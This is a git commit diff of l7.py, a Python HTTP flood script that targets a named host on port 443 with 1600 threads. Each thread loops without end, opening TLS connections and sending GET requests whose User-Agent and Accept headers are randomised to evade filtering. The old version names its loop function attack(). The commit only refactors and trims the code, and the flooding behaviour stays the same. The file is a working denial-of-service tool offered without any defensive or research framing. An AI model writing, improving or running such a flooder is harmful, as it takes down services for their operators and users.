9f63a0873b119da46b5b995c3024755a51356088
JDPST224 <146357456+JDPST224@users.noreply.github.com>
2024-11-12 19:27:06 +0800

    Update l7.py

--- l7.py
+++ l7.py
@@ -5,12 +5,14 @@ import datetime
 import threading
 import sys
 
+# Server configuration
 ip = "nodec.mediathektv.com"
 port = 443
 path = "/"
 threads = 1600
 
-for n,args in enumerate(sys.argv):
+# Update configuration from command-line arguments, if provided
+for n, args in enumerate(sys.argv):
     ip = str(sys.argv[1])
     port = int(sys.argv[2])
     path = str(sys.argv[3])
@@ -20,83 +22,71 @@ Choice = random.choice
 Intn = random.randint
 
 acceptall = [
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-		"Accept-Encoding: gzip, deflate\r\n",
-		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
-		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
-		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
-		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
-		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
-		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-		"Accept: text/html, application/xhtml+xml",
-		"Accept-Language: en-US,en;q=0.5\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
-		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"]
+    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+    "Accept-Encoding: gzip, deflate\r\n",
+    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
+]
 
 def getuseragent():
-	platform = Choice(['Macintosh', 'Windows', 'X11'])
-	if platform == 'Macintosh':
-		os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
-	elif platform == 'Windows':
-		os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
-	elif platform == 'X11':
-		os  = Choice(['Linux i686', 'Linux x86_64'])
-	browser = Choice(['chrome', 'firefox', 'ie'])
-	if browser == 'chrome':
-		webkit = str(Intn(500, 599))
-		version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
-		return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
-	elif browser == 'firefox':
-		currentYear = datetime.date.today().year
-		year = str(Intn(2020, currentYear))
-		month = Intn(1, 12)
-		if month < 10:
-			month = '0' + str(month)
-		else:
-			month = str(month)
-		day = Intn(1, 30)
-		if day < 10:
-			day = '0' + str(day)
-		else:
-			day = str(day)
-		gecko = year + month + day
-		version = str(Intn(1, 72)) + '.0'
-		return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
-	elif browser == 'ie':
-		version = str(Intn(1, 99)) + '.0'
-		engine = str(Intn(1, 99)) + '.0'
-		option = Choice([True, False])
-		if option == True:
-			token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
-		else:
-			token = ''
-		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
+    platform = Choice(['Macintosh', 'Windows', 'X11'])
+    if platform == 'Macintosh':
+        os = Choice(['68K', 'PPC', 'Intel Mac OS X'])
+    elif platform == 'Windows':
+        os = Choice(['Win3.11', 'Windows NT 10.0; Win64; x64'])
+    elif platform == 'X11':
+        os = Choice(['Linux i686', 'Linux x86_64'])
+    
+    browser = Choice(['chrome', 'firefox', 'ie'])
+    if browser == 'chrome':
+        webkit = str(Intn(500, 599))
+        version = f"{Intn(0, 99)}.0.{Intn(0, 9999)}.{Intn(0, 999)}"
+        return f'Mozilla/5.0 ({os}) AppleWebKit/{webkit}.0 (KHTML, like Gecko) Chrome/{version} Safari/{webkit}'
+    elif browser == 'firefox':
+        gecko = f"{datetime.date.today().year}{Intn(1, 12):02}{Intn(1, 30):02}"
+        version = f"{Intn(1, 72)}.0"
+        return f'Mozilla/5.0 ({os}; rv:{version}) Gecko/{gecko} Firefox/{version}'
+    else:
+        return f'Mozilla/5.0 (compatible; MSIE {Intn(1, 99)}.0; {os}; Trident/{Intn(1, 99)}.0)'
 
 def rqheader():
     connection = "Connection: Keep-alive\r\n"
     accept = Choice(acceptall)
-    referer = "Referer: "+ "https://" + ip + "\r\n"
-    useragent = "User-Agent: " + getuseragent() + "\r\n"
-    header =  connection + useragent + accept + referer + "\r\n"
+    referer = f"Referer: https://{ip}\r\n"
+    useragent = f"User-Agent: {getuseragent()}\r\n"
+    header = connection + useragent + accept + referer + "\r\n"
     return header
 
-def attack():
-    while True:
-        get_host = "GET " + path + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ip, port))
-        if port == 443:
-            context = ssl.create_default_context()
-            s = context.wrap_socket(s, server_hostname=ip)
-        
-        for _ in range(200):
-            request = get_host + rqheader()
-            s.sendall(request.encode())
-        s.close()
+def send_request():
+    try:
+        # Create a socket connection
+        with socket.create_connection((ip, port)) as sock:
+            # Wrap the socket if HTTPS (port 443)
+            if port == 443:
+                context = ssl.create_default_context()
+                sock = context.wrap_socket(sock, server_hostname=ip)
+            
+            # Create HTTP GET request
+            request = f"GET {path} HTTP/1.1\r\nHost: {ip}\r\n{rqheader()}"
+            sock.sendall(request.encode())
 
-for x in range(threads):
-    start_attack = threading.Thread(target=attack)
-    start_attack.start()
+            # Optionally, receive and discard response
+            print("Request Sent successful")
+    except Exception as e:
+        print(f"Request error: {e}")
+
+def thread_task():
+    # Each thread sends continuous requests
+    while True:
+        send_request()
+
+# Start the threads
+thread_list = []
+for i in range(threads):
+    thread = threading.Thread(target=thread_task)
+    thread.start()
+    thread_list.append(thread)
+
+# Wait for all threads to complete
+for thread in thread_list:
+    thread.join()
